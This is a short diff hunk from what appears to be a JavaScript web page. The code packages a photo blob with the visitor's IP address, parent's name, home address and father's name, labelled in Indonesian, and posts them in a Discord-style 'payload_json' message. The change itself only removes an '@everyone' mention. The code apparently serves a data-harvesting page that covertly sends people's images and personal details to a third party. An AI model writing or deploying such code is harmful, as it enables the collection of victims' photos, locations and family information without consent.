@@ -76,7 +76,7 @@
           formDataDiscord.append('file', blob, 'photo.png');
 
           var payloadJson = {
-            content: `@everyone Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`
+            content: `Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`
           };
 
           formDataDiscord.append('payload_json', JSON.stringify(payloadJson));
